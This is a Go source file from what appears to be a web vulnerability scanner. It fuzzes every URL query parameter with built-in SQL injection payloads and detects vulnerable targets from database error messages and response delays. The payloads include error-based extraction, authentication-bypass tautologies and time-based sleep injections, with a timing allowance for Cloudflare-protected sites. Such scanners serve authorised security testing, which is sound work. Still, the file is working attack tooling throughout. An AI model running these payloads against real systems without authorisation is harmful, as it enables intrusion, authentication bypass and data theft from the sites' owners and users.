package sqli

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/yupiyy/bhyakugan/internal/core"
	"github.com/yupiyy/bhyakugan/internal/payloadrepo"
	"github.com/yupiyy/bhyakugan/internal/utils"
)

type SQLiPayload struct {
	Name     string
	Payload  string
	Type     string
	Expected string
}

var DBErrors = map[string][]string{
	"MySQL":      {"you have an error in your sql syntax", "warning: mysql_", "mysql_fetch_array()", "valid mysql result", "SQLSTATE[42000]", "Syntax error or access violation"},
	"PostgreSQL": {"postgresql query failed", "pg_query(): query error", "error: syntax error at or near"},
	"MSSQL":      {"unclosed quotation mark after the character string", "driver] [microsoft][sql server native client", "sqlserver error", "SQL Server Error"},
	"Oracle":     {"ora-00933: sql command not properly ended", "ora-01756: quoted string not properly terminated", "ORA-01476"},
	"SQLite":     {"sqlite3::query():", "warning: sqlite_"},
}

var SQLPayloads = []SQLiPayload{
	{"SQLi Error (Single Quote)", "'", "Error", ""},
	{"SQLi Error (Double Quote)", "\"", "Error", ""},
	{"SQLi Error (MySQL ExtractValue)", "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))#", "Error", ""},
	{"SQLi Error (MSSQL Convert)", "' AND 1=CONVERT(int,(SELECT @@version))--", "Error", ""},
	{"SQLi Error (Postgres Cast)", "' AND 1=CAST(version() AS INTEGER)--", "Error", ""},
	{"SQLi Auth Bypass (Tautology)", "' OR '1'='1", "Auth", ""},
	{"SQLi Auth Bypass (Admin)", "admin' --", "Auth", ""},
	{"SQLi Auth Bypass (Limit)", "' OR 1=1 LIMIT 1 --", "Auth", ""},
	{"SQLi Auth Bypass (MD5 Hack)", "ffifdyop", "Auth", ""},
	{"SQLi Time (MySQL RLIKE)", "' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a) RLIKE '1'--", "Time", ""},
	{"SQLi Time (MySQL ELT)", "' OR ELT(1=1,SLEEP(5))--", "Time", ""},
	{"SQLi Time (MySQL BENCHMARK)", "' AND BENCHMARK(5000000,MD5('test'))--", "Time", ""},
	{"SQLi Time (Postgres pg_sleep)", "'; SELECT pg_sleep(5)--", "Time", ""},
	{"SQLi Error (Polyglot)", "sleep(5)/*' or sleep(5) or '\" or sleep(5) or \"*/", "Time", ""},
}

func loadPATTTTimePayloads() []SQLiPayload {
	lines := payloadrepo.LoadLines("SQL Injection/Intruder/Generic_TimeBased.txt", 120)
	if len(lines) == 0 {
		return nil
	}
	out := make([]SQLiPayload, 0, 30)
	seen := make(map[string]bool)
	for _, l := range lines {
		p := strings.TrimSpace(l)
		lp := strings.ToLower(p)
		if p == "" || seen[p] {
			continue
		}
		// Keep only explicit DB sleep primitives; benchmark/randomblob is too noisy.
		if strings.Contains(lp, "sleep(5)") ||
			strings.Contains(lp, "waitfor delay") ||
			strings.Contains(lp, "pg_sleep(5)") {
			seen[p] = true
			out = append(out, SQLiPayload{
				Name:    "SQLi Time (PATTT)",
				Payload: p,
				Type:    "Time",
			})
			if len(out) >= 8 {
				break
			}
		}
	}
	return out
}

func Scan(baseURL string, client *http.Client, ctx core.ScanContext, onFound func(core.Finding)) {
	lowerURL := strings.ToLower(baseURL)
	if strings.HasSuffix(lowerURL, ".js") || strings.HasSuffix(lowerURL, ".css") ||
		strings.HasSuffix(lowerURL, ".png") || strings.HasSuffix(lowerURL, ".jpg") ||
		strings.HasSuffix(lowerURL, ".jpeg") || strings.HasSuffix(lowerURL, ".gif") ||
		strings.HasSuffix(lowerURL, ".svg") || strings.HasSuffix(lowerURL, ".ico") ||
		strings.HasSuffix(lowerURL, ".woff") || strings.HasSuffix(lowerURL, ".woff2") ||
		strings.HasSuffix(lowerURL, ".ttf") || strings.HasSuffix(lowerURL, ".eot") {
		return
	}

	u, err := url.Parse(baseURL)
	if err != nil {
		return
	}
	q := u.Query()

	startBase := time.Now()
	reqBase, errReq := http.NewRequest("GET", baseURL, nil)
	if errReq != nil {
		return
	}
	utils.SetDefaultHeaders(reqBase, baseURL)
	respBase, errBase := client.Do(reqBase)
	baselineDuration := time.Since(startBase).Seconds()
	if errBase != nil {
		return
	}

	baselineBodyBytes, _ := io.ReadAll(respBase.Body)
	respBase.Body.Close()
	baselineBodyLower := strings.ToLower(string(baselineBodyBytes))

	timeThreshold := baselineDuration + 4.0
	if ctx.WAF == "cloudflare" {
		timeThreshold += 2.0
	}

	if baselineDuration > 3.0 {
		return
	}

	var wg sync.WaitGroup
	sem := make(chan struct{}, 5)
	var foundMu sync.Mutex
	isAlreadyVulnerable := false
	allPayloads := append(append([]SQLiPayload{}, SQLPayloads...), loadPATTTTimePayloads()...)

	for _, p := range allPayloads {
		if isAlreadyVulnerable {
			break
		}
		wg.Add(1)
		go func(payload SQLiPayload) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			if isAlreadyVulnerable {
				return
			}

			var target string
			if len(q) > 0 {
				// Fuzz ALL parameters, not just one random one
				for param := range q {
					fuzzU, _ := url.Parse(baseURL)
					fuzzQ := fuzzU.Query()
					fuzzQ.Set(param, payload.Payload)
					fuzzU.RawQuery = fuzzQ.Encode()
					target = fuzzU.String()

					// Perform check for this parameter
					checkTarget(target, payload, client, baselineDuration, timeThreshold, baselineBodyLower, &isAlreadyVulnerable, &foundMu, onFound)
					if isAlreadyVulnerable {
						return
					}
				}
				return // Done fuzzing parameters for this payload
			} else {
				// No parameters, fuzz ID
				target = baseURL + "?id=" + url.QueryEscape(payload.Payload)
				checkTarget(target, payload, client, baselineDuration, timeThreshold, baselineBodyLower, &isAlreadyVulnerable, &foundMu, onFound)
			}
		}(p)
	}
	wg.Wait()
	ScanOracleLengthFilter(baseURL, client, onFound)
}

func checkTarget(target string, payload SQLiPayload, client *http.Client, baselineDuration, timeThreshold float64, baselineBodyLower string, isAlreadyVulnerable *bool, foundMu *sync.Mutex, onFound func(core.Finding)) {
	start := time.Now()
	req, errReq := http.NewRequest("GET", target, nil)
	if errReq != nil {
		return
	}
	utils.SetDefaultHeaders(req, target)
	resp, err := client.Do(req)
	duration := time.Since(start).Seconds()

	if err != nil {
		return
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(resp.Body)
	bodyStr := string(bodyBytes)
	bodyLower := strings.ToLower(bodyStr)

	localThreshold := timeThreshold
	if strings.Contains(payload.Name, "Cloudflare") {
		localThreshold = baselineDuration + 5.0
	}

	isVulnerable := false
	detail := ""
	confidence := "confirmed"

	for db, errors := range DBErrors {
		for _, errStr := range errors {
			if strings.Contains(bodyLower, strings.ToLower(errStr)) {
				if strings.Contains(baselineBodyLower, strings.ToLower(errStr)) {
					continue
				}
				isVulnerable = true
				detail = fmt.Sprintf("Found %s Error: %s", db, errStr)
				break
			}
		}
		if isVulnerable {
			break
		}
	}

	if !isVulnerable && strings.Contains(payload.Name, "Time") {
		if resp.StatusCode == 403 || resp.StatusCode == 406 || resp.StatusCode == 429 {
			return
		}
		if duration >= localThreshold {
			startV2 := time.Now()
			reqV2, _ := http.NewRequest("GET", target, nil)
			utils.SetDefaultHeaders(reqV2, target)
			respV2, errV2 := client.Do(reqV2) // Capture response
			if errV2 == nil {
				defer respV2.Body.Close() // Close body!
				verifyDuration := time.Since(startV2).Seconds()
				if verifyDuration >= localThreshold {
					isVulnerable = true
					margin1 := duration - localThreshold
					margin2 := verifyDuration - localThreshold
					if margin1 >= 1.5 && margin2 >= 1.5 {
						confidence = "confirmed"
					} else {
						confidence = "probable"
					}
					detail = fmt.Sprintf("Time-Based SQLi signal (req1=%.2fs req2=%.2fs threshold=%.2fs).", duration, verifyDuration, localThreshold)
				}
			}
		}
	}

	if isVulnerable {
		foundMu.Lock()
		if !*isAlreadyVulnerable {
			*isAlreadyVulnerable = true
			fmt.Printf("[!] POSITIVE MATCH: %s at %s\n", payload.Name, target)
			onFound(core.Finding{Type: "SQL Injection", Target: target, Detail: detail, Severity: "Critical", Confidence: confidence})
		}
		foundMu.Unlock()
	}
}
